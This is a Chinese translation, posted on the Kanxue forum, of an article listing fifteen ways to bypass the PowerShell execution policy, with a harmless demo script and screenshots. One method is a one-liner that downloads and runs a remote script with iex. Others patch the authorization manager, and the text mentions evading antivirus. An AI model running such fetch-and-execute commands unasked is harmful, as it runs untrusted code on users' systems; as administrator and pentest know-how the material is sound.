@@ -1,0 +1,223 @@
+
+# [翻译] 绕过PowerShell 执行策略的15种方法
+
+在Windows上，PowerShell的默认配置是不允许执行脚本文件的。这对于一些渗透测试人员，系统管理员，程序员等来说，是一个必须面对的障碍。本文中，我将提出15种不需要本地管理员权限就绕过该执行保护策略的方法。我确定依然有许多甚至我不知道的方法没有提到，但是我希望本文对那些需要的人来说是一个良好的开端。
+
+## 什么是PowerShell执行策略？
+
+PowerShell执行策略是用来限制哪些类型的PowerShell脚本能在系统上直接运行。默认它的设置时`Restricted`，即任何脚本都不行。但是，我们需要明确该设置从来都没打算设计成为一个安全控制策略，相反，它本来是为了防止系统管理员发生搬起石头砸自己的脚的情况。这就是为什么有许多围绕它的选项。其中包括一些微软自身提供的。若想了解更多PowerShell的执行策略设置和其他默认安全设置，我推荐你读[Carlos Perez的博客](https://bbs.kanxue.com/elink@fe6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2V1j5i4u0C8L8%4m8W2M7X3q4@1L8%4u0Q4x3X3g2U0L8$3#2Q4x3V1k6T1L8r3!0Y4i4K6u0r3x3U0l9I4x3#2)9J5c8U0y4Q4x3V1j5#2i4K6u0r3M7r3!0%4k6i4u0K6K9r3g2D9L8q4)9J5k6r3u0S2M7$3W2U0M7#2)9J5k6r3g2^5k6h3y4#2N6r3W2G2L8W2)9J5k6s2m8G2L8r3W2U0P5g2)9J5k6s2m8S2M7Y4c8Q4x3X3b7I4i4K6u0W2K9s2c8E0L8l9`.`.)，它提供了一个比较全面的概述。
+
+## 为什么我想绕过执行策略？
+
+为什么PowerShell如此流行，我听到过不少的答案，最常听到就是它可以实现自动化，以下是一些管理员，渗透测试人员，黑客之所以喜欢它的一些原因：
+
+- 是Windows原生的
+- 可以调用Windows API
+- 不需要写入磁盘就可以执行命令
+- 可以逃避Anti-Virus的检测
+- 被大多数程序加入白名单中，标记为可信的
+- 有许多开源的渗透工具集
+
+## 如何察看当前安全策略
+
+在使用PowerShell的所有惊奇的特性前，攻击者要做的第一件事就是绕过`Restricted`执行策略。可以通过命令`Get-ExectionPolicy`来获得当前策略。如果你是第一次使用这个命令，则应该是设置为`Restricted`的，如下：
+
+```
+PS C:\> Get-ExecutionPolicy
+```
+
+![](https://leanote.com/api/file/getImage?fileId=595b6967ab64417b25001331)
+
+同样可以将执行策略设置为不同的级别。如下查看支持的所有级别，若想了解更多关于”Set-ExecutionPolicy”的信息，查看 [Set-ExecutionPolicy](https://bbs.kanxue.com/elink@1d2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0M7$3c8F1i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3M7r3!0%4k6i4u0K6K9r3g2D9L8q4)9J5c8Y4u0W2k6X3g2J5k6h3&6U0k6g2)9J5c8U0g2Q4x3X3f1I4i4K6u0r3L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2M7r3!0%4k6i4u0K6K9r3g2D9L8q4)9J5k6i4y4W2j5%4g2J5K9i4c8&6i4K6u0r3f1$3g2@1i4K6u0V1c8i4S2W2j5%4g2@1K9h3!0F1f1r3!0D9K9h3y4&6)
+
+```
+PS C:\> Get-ExecutionPolicy -List | Format-Table -AutoSize
+```
+
+![](https://leanote.com/api/file/getImage?fileId=595b6a92ab64417d4b001420)
+
+## 实验环境设置
+
+我会使用如下一个脚本来作为例子,`runme.ps1`，该明白用来向控制台输出一句话：
+
+```
+Write-Host "My voice is my passport, verify me."
+```
+
+当我在默认策略的主机上，尝试执行该脚本时，会出现如下错误：
+
+![](https://leanote.com/api/file/getImage?fileId=595b761bab64417b25001471)
+
+如果你的策略太open，你想使用更严格的方式来测试如下的方案，你需要切换到管理员身份，执行`Set-ExecutionPolicy Restricted`。OK，接下来是15种方式：
+
+## 15种绕过方式
+
+### 1. 将你的脚本内容粘贴到一个交互式的PowerShell窗口中
+
+如下，将你的脚本粘贴到console中。但是，你要记住，你的受限程度取决于你当前用户的权限。假如你有一个可以交互式的窗口，则这是最基本的一种方法，而且不需要做任何的配置改变和写入到磁盘中。
+
+![](https://leanote.com/api/file/getImage?fileId=595b761bab64417b2500146d)
+
+### 2. Echo脚本内容，然后Pipe到PowerShell的标准输入中
+
+```
+Echo Write-Host "My voice is my passport, verify me."  | PowerShell.exe -noprofile -
+```
+
+![](https://leanote.com/api/file/getImage?fileId=595b761bab64417b25001470)
+
+### 3. 从一个文件中读取脚本，然后Pipe到PowerShell的标准输入中
+
+此方法有个缺点就是会写入脚本到本地磁盘中，但是你可以从一个网络共享中读取脚本，来避免写内容到磁盘中。
+
+```
+PS C:\temp> Get-Content .\runme.ps1 | powershell.exe -noprofile -
+```
+
+![](https://leanote.com/api/file/getImage?fileId=595b761bab64417b2500146e)
+
+```
+PS C:\temp> Type .\runme.ps1 | powershell.exe -noprofile -
+```
+
+![](https://leanote.com/api/file/getImage?fileId=595b761bab64417b25001469)
+
+### 4. 从一个URL Download脚本内容，然后执行
+
+```
+PS C:\temp> powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('5d5K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0q4Q4x3X3f1J5i4K6u0r3M7Y4g2F1L8h3g2Q4x3X3g2H3M7K6q4Q4x3U0k6Q4x3U0x3K6z5g2)9K6b7W2)9J5z5g2)9J5y4Y4q4#2L8%4c8Q4x3@1t1`."
+```
+
+![](https://leanote.com/api/file/getImage?fileId=595b761bab64417b2500146a)
+
+### 5. 使用-command命令参数
+
+此方法和直接粘贴脚本内容执行的方式很像，但是此方法不需要一个交互式的窗口。它适用于简单脚本的执行，对于复杂脚本会发生解析错误。该方法同样不会写内容到磁盘中。
+
+```
+powershell -command "Write-Host 'My voice is my passport, verify me.'"
+```
+
+![](https://leanote.com/api/file/getImage?fileId=595b761bab64417b2500146c)
+
+你可以将该命令写到一个`bat`文件中，然后放到启动目录中，来帮助提权。
+
+### 6. 使用-encodedCommand命令参数
+
+该方法和上一个方法很相似，但是此方式脚本内容是Unicode/base64 encode的字符串。使用编码的好处是可以让你避免执行使用`Command`参数时产生一些糟糕的解析问题。以下的例子是摘自Posh-SecMod。该工具套件还包括一个小的压缩方法来减少由于encode后字符串太长的情况。
+
+```
+$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
+```
+
+![](https://leanote.com/api/file/getImage?fileId=595b761bab64417b2500146b)
+
+### 7. 使用Invoke-Command 命令
+
+该方法最cool点在于对抗那些PowerShell remoting开启的Remote系统。
+
+```
+invoke-command -scriptblock {Write-Host "My voice is my passport, verify me."}
+```
+
+![](https://leanote.com/api/file/getImage?fileId=595b761bab64417b2500146f)
+
+如下命令，可用来从一个远程系统上抓取执行策略同时运用到本地计算机中.
+
+```
+invoke-command -computername Server01 -scriptblock {get-executionpolicy} | set-executionpolicy -force
+```
+
+### 8. 使用 Invoke-Expression 命令
+
+```
+PS C:\temp> Get-Content ./runme.ps1 | Invoke-ExpressionPS C:\temp> gc .\runme.ps1 | iex(短命令格式)
+```
+
+![](https://leanote.com/api/file/getImage?fileId=595b7cd5ab64417b2500150c)
+
+### 9. 使用Bypass执行策略标志
+
+这个方法是微软提供的用来绕过执行策略的一种方式。当指定该标志后，即视为什么都不做，什么警告也不提示。
+
+```
+powershell -ExecutionPolicy bypass -File ./runme.ps1
+```
+
+![](https://leanote.com/api/file/getImage?fileId=595b7cd5ab64417b2500150e)
+
+### 10. 使用Unrestricted执行策略标志
+
+该标志和bypass很像，但是当使用该标志时，即意味着加载所有的配置文件和执行所有的脚本。如果你运行一个从网上下载的未签名的脚本，会给出权限提示。
+
+```
+powershell -ExecutionPolicy unrestricted -File ./runme.ps1
+```
+
+![](https://leanote.com/api/file/getImage?fileId=595b7cd5ab64417b2500150d)
+
+### 11. 使用Remote-Signed执行策略标志
+
+创建你的脚本，然后按[指南签名](https://bbs.kanxue.com/elink@fbdK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2V1j5i4u0C8L8%4m8W2M7X3q4@1L8%4u0Q4x3X3g2U0L8$3#2Q4x3V1k6T1L8r3!0Y4i4K6u0r3x3U0l9I4x3#2)9J5c8U0y4Q4x3V1j5#2i4K6u0r3M7r3!0%4k6i4u0K6K9r3g2D9L8q4)9J5k6r3u0S2M7$3W2U0M7#2)9J5k6r3g2^5k6h3y4#2N6r3W2G2L8W2)9J5k6s2m8G2L8r3W2U0P5g2)9J5k6s2m8S2M7Y4c8Q4x3X3b7I4i4K6u0W2K9s2c8E0L8l9`.`.)。最后运行:
+
+```
+PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1
+```
+
+### 12. 通过换出认证管理器，禁用执行策略
+
+非常有创造性的一个。如下函数可以在交互式窗口中使用，也可以在Command参数中指定。一旦该函数被执行，则会换出认证管理器，同时默认策略改为unrestricted。但是该方法只在一个会话范围内有效。
+
+```
+function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy  ./runme.ps1
+```
+
+![](https://leanote.com/api/file/getImage?fileId=595b7cd5ab64417b2500150f)
+
+### 13. 设置执行策略为Process作用域
+
+我们之前介绍中提到过，执行策略可以应用到过个级别。其中就包括你完全控制的process。使用该方法仅限于当前session中，执行策略会变为`unrestricted`。
+
+```
+Set-ExecutionPolicy Bypass -Scope Process
+```
+
+![](https://leanote.com/api/file/getImage?fileId=595b7cd5ab64417b2500150a)
+
+### 14. 通过命令设置执行策略为CurrentUser作用域
+
+```
+Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
+```
+
+![](https://leanote.com/api/file/getImage?fileId=595b7cd5ab64417b25001510)
+
+### 15. 通过注册表设置执行策略为CurrentUser作用域
+
+该方法和Process作用域方法很相似，但是通过修改注册表Key可将设置持续应用到当前用户的环境中。
+
+```
+HKEY_CURRENT_USER\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell
+```
+
+![](https://leanote.com/api/file/getImage?fileId=595b7cd5ab64417b2500150b)
+
+## 总结
+
+该主题的目的是为了让执行策略不再成为程序员，管理员或渗透测试人员的一个障碍。微软同样也没有打算将其设置为一个安全控制。这就是为什么有如此多的方法来绕过它。微软也提供了一些本地选项，安全社区中同样有许多有意思的tricks。最后，祝在PowerShell冒险中好运，别忘了为你的Hack行为负责。
+
+——————————
+
+原文链接: [15 Ways to Bypass the PowerShell Execution Policy](https://bbs.kanxue.com/elink@80cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2L8X3g2@1M7%4m8A6i4K6u0W2j5$3!0E0i4K6u0r3x3e0g2Q4x3X3c8%4j5i4W2K6i4K6u0V1N6r3!0Q4x3X3c8T1P5i4m8S2M7%4y4Q4x3X3c8@1K9r3g2Q4x3X3c8H3L8%4N6W2M7Y4y4Z5k6h3I4D9i4K6u0V1k6i4S2W2j5%4g2@1K9h3!0F1i4K6u0V1M7r3!0D9K9h3y4&6i4K6u0r3)
+
+本文章由看雪翻译小组 ghostway 翻译
+
+——————————
+
+[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
+
+上传的附件：
+
+- [绕过PowerShell-执行策略的15种方法.pdf](javascript:void(0);)
+
+  （501.83kb，21次下载）
